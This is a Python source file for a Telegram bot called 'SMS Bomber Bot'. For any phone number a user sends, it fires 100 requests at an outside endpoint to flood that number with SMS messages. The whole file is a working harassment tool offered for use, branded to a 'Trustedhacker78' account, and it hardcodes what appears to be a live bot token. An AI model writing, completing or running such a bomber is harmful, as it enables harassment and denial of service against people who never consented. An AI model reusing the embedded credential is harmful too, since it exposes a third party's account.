import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ContextTypes, filters
import asyncio

# 🔐 Your bot token
TELEGRAM_BOT_TOKEN = "7414072238:AAESmNvI7dY9iyMnieUYXu5QoP5JqGMJ7Ys"

# 🧠 Store users' phone numbers
user_sessions = {}

## 🔘 /start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("👤 Owner", url="https://t.me/Trustedhacker78"),
         InlineKeyboardButton("💬 Support", url="https://t.me/Trustedhacker78")],
        [InlineKeyboardButton("🔄 Join Channel", url="https://t.me/trustedhacker079")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    caption = (
        "👋 Welcome to **SMS Bomber Bot**!\n\n"
        "📱 Send me a phone number and I'll start bombing it with SMS!\n\n"
        "_Built with ❤️ by @TrustedHacker78_"
    )

    await update.message.reply_text(caption, parse_mode="Markdown", reply_markup=reply_markup)

## 📲 Handle phone numbers
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text

    # Check if input is a number (basic validation)
    if not text.isdigit():
        await update.message.reply_text("❌ Please send a valid phone number.")
        return

    phone_number = text
    await update.message.reply_text(f"🚀 Starting SMS bombing on {phone_number}...")

    # Start bombing continuously
    for _ in range(100):  # adjust number of requests if needed
        try:
            response = requests.get(f"https://shakeel.free.nf/sms.php?phone={phone_number}")
            print(f"Sent to {phone_number}: {response.text}")
            await asyncio.sleep(1)  # wait 1 second between requests (be nice to server)
        except Exception as e:
            await update.message.reply_text(f"⚠️ Error: {e}")
            break

    await update.message.reply_text(f"✅ SMS bombing completed for {phone_number}!")

## 🚀 Bot start
if __name__ == "__main__":
    app = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    print("🤖 SMS Bomber Bot by @Trustedhacker78 is running...")
    app.run_polling()
  
